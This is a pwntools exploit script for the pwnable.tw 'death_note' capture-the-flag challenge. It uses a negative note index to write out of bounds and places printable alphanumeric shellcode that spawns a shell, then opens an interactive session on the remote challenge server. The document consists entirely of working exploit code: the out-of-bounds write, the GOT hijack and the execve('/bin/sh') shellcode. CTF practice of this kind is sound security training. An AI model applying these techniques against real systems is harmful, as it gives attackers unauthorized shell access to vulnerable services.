#!/usr/bin/env python3

from pwn import *

exe = ELF("./death_note")
context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10104)
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)

    return r
r = conn()
def add_note(index, name):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'Index :', str(index).encode())
    r.sendlineafter(b'Name :', name)
def del_note(index):
    r.sendlineafter(b'Your choice :', b'2')
    r.sendlineafter(b'Index :', str(index).encode())
def show_note(index): 
    r.sendlineafter(b'Your choice :', b'3')
    r.sendlineafter(b'Index :', str(index).encode())
shellcode = asm(
    '''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80
    ''', arch='i386')
name = b'BF?D@gA{nFLgE_nEHhEyHMLODMHMEo?nLGAO&'
add_note(-19, name)
del_note(-19)
r.interactive()